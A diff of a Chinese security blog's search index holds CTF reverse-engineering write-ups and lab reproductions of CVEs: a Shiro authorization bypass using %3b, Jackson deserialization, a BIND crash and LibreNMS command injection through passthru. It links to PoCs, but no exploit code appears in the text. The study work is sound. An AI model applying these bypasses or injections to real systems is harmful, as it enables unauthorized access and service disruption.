+<p>利用yafu分解（windows安装：<a href="https://blog.csdn.net/weixin_41603028/article/details/97167312%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E5%A6%82%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BD%AC%E6%8D%A2%E5%8D%B3%E5%8F%AF">https://blog.csdn.net/weixin_41603028/article/details/97167312），然后编写脚本如下，然后转换即可</a></p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110180421766.png" alt="image-20201110180421766"></p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110180133377.png" alt="image-20201110180133377"></p>
+<p>问题：</p>
+<p>python3一直无法导入gmpy2的包，只能用python2写了</p>
+<h5 id="0x03-igniteme"><a href="#0x03-igniteme" class="headerlink" title="0x03 igniteme"></a>0x03 igniteme</h5><p>ida分析，主函数如下：</p>
+<p>可以看到前四位和最后一位是定的，对v7做一个sub_4011C0函数的判断</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110164753556.png" alt="image-20201110164753556"></p>
+<p>跟进函数看看：</p>
+<p>把值给了v8，然后v8经过一些操作变成v4，v4和最后的字符串相同</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110164900645.png" alt="image-20201110164900645"></p>
+<p>查看unk_4420B0和sub_4013C0</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110161046021.png" alt="image-20201110161046021"></p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110161059343.png" alt="image-20201110161059343"></p>
+<p>编写脚本如下即可，然后转一下大小写</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110165109839.png" alt="image-20201110165109839"></p>
+<h5 id="0x04-hackme（-amp-0xff）"><a href="#0x04-hackme（-amp-0xff）" class="headerlink" title="0x04 hackme（&amp;0xff）"></a>0x04 hackme（&amp;0xff）</h5><p>ida分析，找到主函数，分析一下就是，输入字符串，长度为22位，然后抽取其中的10位进行检验（可以看到数组byte_6B4270是22位的），检验方法就是v9和输入的字符串进行异或后要和固定的数组内容相同</p>
+<p><strong>注意：循环10次不代表字符串只有10位</strong></p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110182250771.png" alt="image-20201110182250771"></p>
+<p>查看byte_6B4270的内容</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110182511109.png" alt="image-20201110182511109"></p>
+<p>可以编写脚本如下：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201111111154246.png" alt="image-20201111111154246"></p>
+<p>要注意的是，v1[i]的值很大，需要和0xff相与，0xff最大值是255，由于整数值超过了255，所以用来控制</p>
+<h5 id="0x05-ReverseMe"><a href="#0x05-ReverseMe" class="headerlink" title="0x05 ReverseMe"></a>0x05 ReverseMe</h5><p>ida分析：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201111143110520.png" alt="image-20201111143110520"></p>
+<h5 id="0x06-easyre1"><a href="#0x06-easyre1" class="headerlink" title="0x06 easyre1"></a>0x06 easyre1</h5><p>打开ida就能看到，提交即可</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201113115339027.png" alt="image-20201113115339027"></p>
+<h5 id="0x07-76号"><a href="#0x07-76号" class="headerlink" title="0x07 76号"></a>0x07 76号</h5><p>发现有个upx的壳，脱壳</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125151636534.png" alt="image-20201125151636534"></p>
+<p>放到ida分析，搜索字符串可以看到有correct字符，查找位置，找到主函数</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126113743706.png" alt="image-20201126113743706"></p>
+<p>但是主函数反编译不出来，重要函数80485E0可以反编译，里面定义了很多变量和switch匹配，不是很理解，动态调试后发现就是匹配输入的字符串，v3就是输入的每一位，v5的由输入的字符串决定的位置是为1，然后再switch里做判断，最后return为1的话就正确</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126113826531.png" alt="image-20201126113826531"></p>
+<p>然后就一位一位推测就可以了</p>
+<p>一开始推到了15位，发现在14位的时候直接会跳转到0，研究后发现和v5数组有关，当输入的是h的时候，v11并不会为1，所以就会return 0</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126114240393.png" alt="image-20201126114240393"></p>
+<p>找到对应关系后重新推测：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126114216580.png" alt="image-20201126114216580"></p>
+<p>调试验证成功：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126112823384.png" alt="image-20201126112823384"></p>
+<h5 id="0x08-easyhook（hook）"><a href="#0x08-easyhook（hook）" class="headerlink" title="0x08 easyhook（hook）"></a>0x08 easyhook（hook）</h5><p>主函数，关键函数为sub_401220和sub_401240，然后创建了一个文件</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134415789.png" alt="image-20201116134415789"></p>
+<p>运行一下，发现输入的字符串被改变了：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116141148468.png" alt="image-20201116141148468"></p>
+<p>动态调试一下，发现确实在这里写入的输入字符串被改变了</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116141519684.png" alt="image-20201116141519684"></p>
+<p>401220:点进4010D0看看</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134620725.png" alt="image-20201116134620725"></p>
+<p>4010D0:</p>
+<p>Virtualprotectex修改了指定进程，hprocess和lpaddress是要更改的进程的句柄和页面区域的基地址的指针，5是访问保护属性已更改的区域的大小，以字节为单位。</p>
+<p>Writeprocessmemory写入了指定数据，byte_40C9BC是指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据。5是写入的数据大小</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134806821.png" alt="image-20201116134806821"></p>
+<p>返回401220看看是怎么修改的</p>
+<p>byte_40C9BC是0xE9，但是这只有一个字节，所以后四个字节就是40C9BD的内容，40C9BD和401080有关</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142056410.png" alt="image-20201116142056410"></p>
+<p>401080:调用了sub_401000,lpbuffer指向包含要写入文件或设备的数据的缓冲区的指针。同时，真正flag的判定条件numer==1也是这里决定的</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142205966.png" alt="image-20201116142205966"></p>
+<p>401000:可以看到对a1进行的操作，编写脚本即可</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142459347.png" alt="image-20201116142459347"></p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116154606478.png" alt="image-20201116154606478"></p>
+<p>401240:并没有什么作用</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134559636.png" alt="image-20201116134559636"></p>
+<h5 id="0x09-secret-string-400（js）"><a href="#0x09-secret-string-400（js）" class="headerlink" title="0x09 secret-string-400（js）"></a>0x09 secret-string-400（js）</h5><p>打开看是一个html和一个js文件，之前没接触过</p>
+<p>打开html，是一个验证输入页面，随便输入一个字符串，会弹出nope</p>
+<p>搜索了下怎么调试js，开始尝试在代码各处里加入console.log，然后f12查看输出情况</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116171456917.png" alt="image-20201116171456917"></p>
+<p>然后页面中出现了隐藏的代码：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116170210757.png" alt="image-20201116170210757"></p>
+<p>根据这个代码写出脚本即可：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116171607888.png" alt="image-20201116171607888"></p>
+<h5 id="0x0A-easymaze"><a href="#0x0A-easymaze" class="headerlink" title="0x0A easymaze"></a>0x0A easymaze</h5><p>ida分析主函数</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116172904202.png" alt="image-20201116172904202"></p>
+<p>由于分析两个step函数比较复杂，且容易分析错，可以动态调试(linux下的远程动态调试)找出生成的迷宫，下断点，找v5的位置</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117091836672.png" alt="image-20201117091836672"></p>
+<p>再看step2，告诉我们怎么走</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117092345267.png" alt="image-20201117092345267"></p>
+<p>根据迷宫走即可</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117092811994.png" alt="image-20201117092811994"></p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117092755620.png" alt="image-20201117092755620"></p>
+<h5 id="0x0B-reverse-reverse-for-the-holy-grail"><a href="#0x0B-reverse-reverse-for-the-holy-grail" class="headerlink" title="0x0B reverse reverse-for-the-holy-grail"></a>0x0B reverse reverse-for-the-holy-grail</h5><p>ida分析，可以看到v4的值是判定条件，跟进stringmod看看</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117160814789.png" alt="image-20201117160814789"></p>
+<p>stringmod:是一大堆函数，理解一下</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117160928953.png" alt="image-20201117160928953"></p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117161027159.png" alt="image-20201117161027159"></p>
+<p>编写脚本：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117160731736.png" alt="image-20201117160731736"></p>
+<h5 id="0x0C-serial-150（动态调试）"><a href="#0x0C-serial-150（动态调试）" class="headerlink" title="0x0C serial-150（动态调试）"></a>0x0C serial-150（动态调试）</h5><p>ida动态调试：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117180507650.png" alt="image-20201117180507650"></p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/8F5E6F84-02A8-4523-874E-03A0F3AA1C02.png" alt="8F5E6F84-02A8-4523-874E-03A0F3AA1C02"></p>
+<p>看到比较长度的代码，10h，所以长度为16</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/915BC464-5DEA-4841-9715-7CACBA9B7E68.png" alt="915BC464-5DEA-4841-9715-7CACBA9B7E68"></p>
+<p>比较第一个字符，所以第一个字符是E</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/97BED366-6105-4D26-A4E7-6808DAF3C544.png" alt="97BED366-6105-4D26-A4E7-6808DAF3C544"></p>
+<p>第一个字符加上最后一个字符为9B，所以最后一个字符是V(9B-45=56的ascii码)</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/23F762B1-FEB7-48EA-920E-F7F852E166D3.png" alt="23F762B1-FEB7-48EA-920E-F7F852E166D3"></p>
+<p>第二位是5A,即Z</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117180907737.png" alt="image-20201117180907737"></p>
+<p>第二位和倒数第二位加起来还是9B,倒数第二位是A</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117181154507.png" alt="image-20201117181154507"></p>
+<p>按理类推即可：EZ9dmq4c8g9G7bAV</p>
+<h5 id="0x0D-babymips（mips-位运算符）"><a href="#0x0D-babymips（mips-位运算符）" class="headerlink" title="0x0D babymips（mips,位运算符）"></a>0x0D babymips（mips,位运算符）</h5><p>下载了一个软件用来反汇编mips</p>
+<p>就很清楚了。先比较前五个字符，然后在FUN_004007f0里比较后面的</p>
+<p>注意：-的优先级大于^</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201120083337582.png" alt="image-20201120083337582"></p>
+<p>进入函数查看，重点其实就是 b = (a&lt;&lt;0x1a)&gt;&gt;0x18 | a &gt;&gt;6这两句，现在已知b，求a</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201120083511211.png" alt="image-20201120083511211"></p>
+<p>注意：&lt;&lt;和&gt;&gt;操作是32位的，优先级大于｜</p>
+<p>因为a肯定是字符，所以1只会出现在后8位，b也是字符，</p>
+<p>那么(a&lt;&lt;0x1a)&gt;&gt;0x18的操作就相当于在原来的后面加两个0，即a&lt;&lt;2</p>
+<p>b = a&lt;&lt;2|a&gt;&gt;6</p>
+<p>同时byte（8位）对整个式子做了限制（强制转换时计算机只保留其后8位），uint和int修饰第一个式子</p>
+<p>所以这个式子需要这样理解：</p>
+<p>a&lt;&lt;2，即高两位消失，低两位变0</p>
+<p>a&gt;&gt;6，即低六位消失，高两位变成低两位</p>
+<p>即循环位移</p>
+<p>例如：a =  10100011 </p>
+<p>1010001100|0000010 = 1010001110 -&gt;10001110 = b</p>
+<p>所以我们的a可以这样用b来表示</p>
+<p>a = (b &amp; 00000011(0x3) )&lt;&lt;6|(b &amp; 11111100(0xfc))&gt;&gt;2</p>
+<p>或者a = (byte)(b&lt;&lt;6|b&gt;&gt;2)</p>
+<p>编写脚本如下：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201120095913785.png" alt="image-20201120095913785"></p>
+<h5 id="0x0E-Windows-Reverse2-base64"><a href="#0x0E-Windows-Reverse2-base64" class="headerlink" title="0x0E Windows_Reverse2(base64)"></a>0x0E Windows_Reverse2(base64)</h5><p>先ida看看主函数：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201123170313048.png" alt="image-20201123170313048"></p>
+<p>看看401240具体干了什么，有点复杂，再进入401000</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201124165655973.png" alt="image-20201124165655973"></p>
+<p>还是很复杂，决定动态调试看看：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201124165724832.png" alt="image-20201124165724832"></p>
+<p>动态后可以明白401240是先将输入的字符两个两个一组然后代表一位十六进制</p>
+<img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201123170618917.png" alt="image-20201123170618917" style="zoom:50%;">
+
+<p>然后401000将前3位和后三位分开，分别经过操作转为4位，最后输出</p>
+<p>那么可以编写脚本如下：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201124165542112.png" alt="image-20201124165542112"></p>
+<p>最终flag是ADEBDEAEC7BE</p>
+<h5 id="0x0F-Windows-Reverse1"><a href="#0x0F-Windows-Reverse1" class="headerlink" title="0x0F Windows_Reverse1"></a>0x0F Windows_Reverse1</h5><p>加壳了：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125100611130.png" alt="image-20201125100611130"></p>
+<p>脱一下：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125100741673.png" alt="image-20201125100741673"></p>
+<p>怎么既视感这么强，这是一个系列吗</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125100955283.png" alt="image-20201125100955283"></p>
+<p>进入401000看看：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125110924068.png" alt="image-20201125110924068"></p>
+<p>看起来只要赋值一下，看看这个402FF8数组</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125111016733.png" alt="image-20201125111016733"></p>
+<p>空的，不是很理解，决定动态跑一下，输入了1</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125103632415.png" alt="image-20201125103632415"></p>
+<p>可以看到是到aZyxwvutsrqponm这个数组里去找了</p>
+<p>但是也不是正常的输入的序号就是对应的第几位</p>
+<p>多尝试几个后发现是输入的ascii码-32</p>
+<p>所以编写脚本即可：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125111234444.png" alt="image-20201125111234444"></p>
+<p>相差的32位是在这里：数组起始位置是2ff8,下面对于开始有字符对应的是3018</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125112156887.png" alt="image-20201125112156887"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
   </entry>
   <entry>
     <title>0x05Cve-2020-16898 复现</title>
@@ -793,26 +837,6 @@
       </tags>
   </entry>
   <entry>
-    <title>0x09CVE-2020-11113复现</title>
-    <url>/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="CVE-2020-11113复现"><a href="#CVE-2020-11113复现" class="headerlink" title="CVE-2020-11113复现"></a>CVE-2020-11113复现</h4><p>复现参考：<a href="https://blog.csdn.net/mukami0621/article/details/108447493">https://blog.csdn.net/mukami0621/article/details/108447493</a></p>
-<p>这两个漏洞复现方式很像…</p>
-<a id="more"></a>
-
-<p>POC:<a href="https://github.com/Al1ex/CVE-2020-11113">https://github.com/Al1ex/CVE-2020-11113</a></p>
-<p>项目里已经搭好了环境，其实应该按之前复现过的24616流程，稍微改改POC内容即可</p>
-<p>复现成功结果：</p>
-<p><img src="/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/image-20201102140016594.png" alt="image-20201102140016594"></p>
-<p>出现的问题：</p>
-<p>1、有一个包无法下载</p>
-<p>解决：<a href="https://mvnrepository.com,自行下载导入(虽然官网的验证蛮烦的/">https://mvnrepository.com，自行下载导入（虽然官网的验证蛮烦的</a></p>
-<p>2、和24616不一样，恶意类发送了但是不知道为啥计算器弹不出来…</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
     <title>0x08cve-2020-15148 Yii2反序列化漏洞复现</title>
     <url>/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h4 id="cve-2020-15148-Yii2反序列化漏洞复现"><a href="#cve-2020-15148-Yii2反序列化漏洞复现" class="headerlink" title="cve-2020-15148 Yii2反序列化漏洞复现"></a>cve-2020-15148 Yii2反序列化漏洞复现</h4><p>参考：</p>
@@ -846,6 +870,112 @@
       </categories>
       <tags>
         <tag>yii2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x07cve-2020-13933复现</title>
+    <url>/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="cve-2020-13933：Apache-shiro-权限绕过漏洞复现"><a href="#cve-2020-13933：Apache-shiro-权限绕过漏洞复现" class="headerlink" title="cve-2020-13933：Apache shiro 权限绕过漏洞复现"></a>cve-2020-13933：Apache shiro 权限绕过漏洞复现</h4><p>这个复现非常简单，先用IDEA+shiro搭环境</p>
+<p>参考：<a href="https://www.cnblogs.com/ph4nt0mer/p/13535999.html">https://www.cnblogs.com/ph4nt0mer/p/13535999.html</a></p>
+<a id="more"></a>
+
+<p>然后运行，访问，抓包即可</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200923095122117.png" alt="image-20200923095122117"></p>
+<p>访问test，成功</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183129207.png" alt="image-20200922183129207"></p>
+<p>要越权访问test文件夹下的内容，跳转到登录界面</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183151071.png" alt="image-20200922183151071"></p>
+<p>进行%3b的操作，绕过登录访问到了页面内容</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183207361.png" alt="image-20200922183207361"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>apaches shiro</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x09CVE-2020-11113复现</title>
+    <url>/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="CVE-2020-11113复现"><a href="#CVE-2020-11113复现" class="headerlink" title="CVE-2020-11113复现"></a>CVE-2020-11113复现</h4><p>复现参考：<a href="https://blog.csdn.net/mukami0621/article/details/108447493">https://blog.csdn.net/mukami0621/article/details/108447493</a></p>
+<p>这两个漏洞复现方式很像…</p>
+<a id="more"></a>
+
+<p>POC:<a href="https://github.com/Al1ex/CVE-2020-11113">https://github.com/Al1ex/CVE-2020-11113</a></p>
+<p>项目里已经搭好了环境，其实应该按之前复现过的24616流程，稍微改改POC内容即可</p>
+<p>复现成功结果：</p>
+<p><img src="/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/image-20201102140016594.png" alt="image-20201102140016594"></p>
+<p>出现的问题：</p>
+<p>1、有一个包无法下载</p>
+<p>解决：<a href="https://mvnrepository.com,自行下载导入(虽然官网的验证蛮烦的/">https://mvnrepository.com，自行下载导入（虽然官网的验证蛮烦的</a></p>
+<p>2、和24616不一样，恶意类发送了但是不知道为啥计算器弹不出来…</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>0x0ACVE-2020-8617复现</title>
+    <url>/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="CVE-2020-8617复现"><a href="#CVE-2020-8617复现" class="headerlink" title="CVE-2020-8617复现"></a>CVE-2020-8617复现</h4><p>参考：<a href="https://github.com/knqyf263/CVE-2020-8617">https://github.com/knqyf263/CVE-2020-8617</a></p>
+<a id="more"></a>
+
+<p>0x1 下载docker镜像后运行（服务器环境）</p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095624465.png" alt="image-20201110095624465"></p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103142215582.png" alt="image-20201103142215582"></p>
+<p>0x2 安装pipenv</p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095701235.png" alt="image-20201110095701235"></p>
+<p>0x3 因为已经有pipfile.lock文件，所以运行脚本会自动安装依赖，可以看到运行脚本之后服务器就崩溃了</p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103143139388.png" alt="image-20201103143139388"></p>
+<p>0x4 流量包情况</p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103145742284.png" alt="image-20201103145742284"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>pipenv</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x0Ccve-2019-10669</title>
+    <url>/2020/11/11/0x0Ccve-2019-10669/</url>
+    <content><![CDATA[<h4 id="CVE-2019-10669LibreNMS-命令注入漏洞"><a href="#CVE-2019-10669LibreNMS-命令注入漏洞" class="headerlink" title="CVE-2019-10669LibreNMS 命令注入漏洞"></a>CVE-2019-10669LibreNMS 命令注入漏洞</h4><p>参考：<a href="https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md">https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md</a></p>
+<a id="more"></a>
+
+<h5 id="0x1-漏洞复现"><a href="#0x1-漏洞复现" class="headerlink" title="0x1 漏洞复现"></a>0x1 漏洞复现</h5><p>这个漏洞的环境也是蛮麻烦的</p>
+<p>看到poc发现是集成的msf模块，然后到我的msf里一查，发现已经有了</p>
+<p>攻击环境就准备好了</p>
+<p>靶机环境：</p>
+<p>本来想下软件装，装了好几次不成功</p>
+<p>参考：<a href="https://cloud.tencent.com/developer/article/1518046">https://cloud.tencent.com/developer/article/1518046</a></p>
+<p>先下一个librenms的ubuntu版直接虚拟机跑</p>
+<p>然后根据参考改一下网卡的配置，在主机上访问对应的ip地址和端口就能访问web界面了</p>
+<p>此时在kali里跑msf，始终打不成功，看报错是没找到对应的collectd插件</p>
+<p>需要在ubuntu换源更新下载安装一条龙</p>
+<p>装好了之后根据官方配置（太简略，并不能成功（<a href="https://docs.librenms.org/Support/Configuration/#collectd">https://docs.librenms.org/Support/Configuration/#collectd</a></p>
+<p>最后找到github上一个配置才成功，此时页面上出现了collectd插件</p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100410102.png" alt="image-20201112100410102"></p>
+<p>也能打成功了</p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100430763.png" alt="image-20201112100430763"></p>
+<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>漏洞点：html/includes/graphs/device/collectd.inc.php</p>
+<p>其中用户提供的参数from和to是用mysqli_escape_real_string函数（mres）过滤的，但是这个函数不能转义多个命令行语法字符，我们就可以注入命令到变量$rrd_cmd中，通过passthru()执行</p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/DED6A2E31D73FFB660CEFBF548FD1BD6.png" alt="DED6A2E31D73FFB660CEFBF548FD1BD6"></p>
+<p>passthru — 执行外部程序并且显示原始输出</p>
+<p>passthru ( string $command [, int &amp;$return_var ] ) : void </p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/B99C52DBA71F8893ED2EBA7059B778F5.jpg" alt="B99C52DBA71F8893ED2EBA7059B778F5"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205158282.png" alt="image-20201112205158282"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205315869.png" alt="image-20201112205315869"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412.jpg" alt="3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205357269.png" alt="image-20201112205357269"></p>
+<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p>
+]]></content>
